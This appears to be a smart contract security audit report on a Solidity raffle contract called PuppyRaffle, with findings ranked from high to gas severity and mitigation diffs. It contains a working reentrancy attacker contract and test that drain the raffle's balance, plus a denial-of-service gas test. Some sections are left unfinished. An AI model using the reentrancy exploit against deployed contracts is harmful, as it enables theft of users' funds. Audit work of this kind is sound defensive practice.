### [H-1] Reentrancy vulnerability in  `PuppyRaffle::refund` allows entrant to drain raffle contract balance

**Description**

The `PuppyRaffle:refund` function does not follow CEI (Checks, Effects, Interactions). As a result, a malicious user can drain the balance of the contract by exploiting a reentrancy vulnerability in this function.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle can call refund. If this player is a contract with a `fallback` or `receive` function which calls `PuppyRaffle::refund` function again and claim another refund. This cycle repeats until the contract balance is drained.

**Impact**

All funds paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept**

1. Users enter the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript

    function testReentrancyRefund() public {
        // enter a few players into the raffle
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);

        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 startingAttackUserBalance = attackUser.balance;
        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingPuppyContractBalance = address(puppyRaffle).balance;

        console.log("startingAttackUserBalance: ", startingAttackUserBalance);
        console.log("startingAttackContractBalance: ", startingAttackContractBalance);
        console.log("startingPuppyContractBalance: ", startingPuppyContractBalance);

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("EndingAtackerAddressBalance: ", attackUser.balance);
        console.log("endingAttackContractBalance: ", address(attackerContract).balance);
        console.log("endingPuppyContractBalance: ", address(puppyRaffle).balance);

        console.log(address(attackerContract).balance);
        console.log(startingAttackContractBalance);
        console.log(startingPuppyContractBalance);
        //Show that the attack contract has all the funds
        assert(address(attackerContract).balance == startingAttackUserBalance + startingPuppyContractBalance);
    }

```

And this contract as well

```javascript

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() public payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

}

```

</details>

**Recommended Mitigation**

To prevent this, the `PuppyRaffle::refund` should update the `players` array prior to making the external. Additionally, we should also emit the event prior to making the external call.


```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);

        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```



### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description**

Hashing `msg.sender`, `block.timestamp` and `block.difficulty` together creates a predictable final number. A predictable number is not a truly random number. Malicious users can manipulate these values in order to chose the winner of the raffle themselves.

*Note:* This additionally means that users could front-run this function and call `refund` if they see they are not the winner.

**Impact**

Any user can influence the winner of the raffle, winning the money and selecting the rarity of the NFT. This could make the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept** (proof of code)

**Recommended Mitigation**


### [M-#] Unbounded loop checking for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DOS) attack, incrementing gas costs for future entrants 

**Description**

The `PuppyRaffle::enterRaffle` function loops through the `PuppyRaffle::players` array to check for duplicates. As this array gets large, this operation becomes more expensive. This means the gas cost for later users per draw will be significantly more expensive than gas costs for earlier users per draw.

```javascript
@>  for (uint256 i = 0; i < players.length - 1; i++) {
@>      for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact**

The gas costs for raffle entrants will greatly increase as more players enter the raffle. This may discourage later usrs from entering. It also may cause a rush at the start of the raffle to be an early entrant.

An attacker might make the `PuppyRaffle::players` array so large that no one else enters, ensuring they win.

**Proof of Concept** (proof of code)

If we have two sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~ 6,252,048
- 2nd 100 players: ~ 18,068,138

This is roughly 3x more expensive for the second 100 players.


<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`

```javascript
    function testDosAttack() public {
        vm.txGasPrice(1);

        uint256 numPlayers = 100;
        address[] memory players = new address[](numPlayers);
        for (uint i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }

        //see how much gas it costs
        uint256 gasStart = gasleft();
        //Enter the players
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;

        console.log("gas cost of first 100 players, gasUsedFirst: ", gasUsedFirst);

        //now for the second 100 players
        address[] memory players2 = new address[](numPlayers);
        for (uint i = 0; i < numPlayers; i++) {
            players2[i] = address(i + numPlayers);
        }

        //see how much gas it costs
        uint256 gasStart2 = gasleft();
        //Enter the players
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players2);
        uint256 gasEnd2 = gasleft();

        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;

        console.log("gas cost of second 100 players, gasUsedSecond: ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

</details>


**Recommended Mitigation**

There are a few recommendations:

1. Consider allowing duplicates. Users can make new wallet addresses anyway, so the duplicate check doesn't prevent the same person from entering multiple times.
2. Consider allowing a mapping to check for duplicates. This would allow constant time lookup of whether the user has entered the raffle previously.


<details>
<summary>Mapping solution diff</summary>

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;            
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }    
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
</details>

3. Also consider using [OpenZeppelin's `EnumerableSet` library].
(https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet)


### [L-1]: `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for the player at index 0. This causes the player at index 0 to incorrectly think they have not entered the raffle

**Description**

If a player is in the `PuppyRaffle::players` array at index 0, this will reuturn 0, but according to the natspec, it will also return 0 if the player is not in the array.

**Impact**

A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept** (proof of code)

1. User enters the raffle as the first entrant.
2. User calls `PuppyRaffle::getActivePlayerIndex` with their address as an argument, this function will return 0.
3. User thinks they have not entered correctly due to documentation, they attempt to enter again.

**Recommended Mitigation**

The easiest fix is to revert if the player is not in the array instead of returning 0.

The protocol could also reserve the 0th position.

The function could also return an `int256` value of -1 if the player is not active.


### [I-1]: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](src/PuppyRaffle.sol#L2)

```javascript
pragma solidity ^0.7.6;
```


### [I-2]: Using an outdated version of Solidty is not recommended

Please use a newer version like `pragma solidity 0.8.18;`

The recommendations take into account:

1. Risks related to recent releases
2. Risks of complex code generation changes
3. Risks of new language features
4. Risks of known bugs
Please see [slither] (https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity)



### [I-3]: Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 70](src/PuppyRaffle.sol#L70)

	```solidity
	        feeAddress = _feeAddress;
	```

- Found in src/PuppyRaffle.sol [Line: 184](src/PuppyRaffle.sol#L184)

	```solidity
	        previousWinner = winner;
	```

- Found in src/PuppyRaffle.sol [Line: 212](src/PuppyRaffle.sol#L212)

	```solidity
	        feeAddress = newFeeAddress;
	```



### [I-4]: `PuppyRaffle::selectWinner` should follow CEI, which is not a best practice

It's best to follow CEI (checks, effects, interactions)


```diff
-        (bool success,) = winner.call{value: prizePool}("");  
-        require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}(""); 
+        require(success, "PuppyRaffle: Failed to send prize pool to winner"); 
```


### [G-1]: Unchanged state variables should be declared constant or immutable

Reading from storage is more expenseive than reading from constant or immutable

Instances:
1. `PuppyRaffle:raffleDuration` should be `immutable`
2. `PuppyRaffle:commonImageUri` should be `constant`
3. `PuppyRaffle:rareImageUri` should be `constant`
4. `PuppyRaffle:legendaryImageUri` should be `constant`



### [G-2]: Storage variables in a loop should be cached

Each time you call `players.length` you read from storage, as opposed to memory which is gas inefficient.

```diff
+       uint256 playerLength = players.length
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
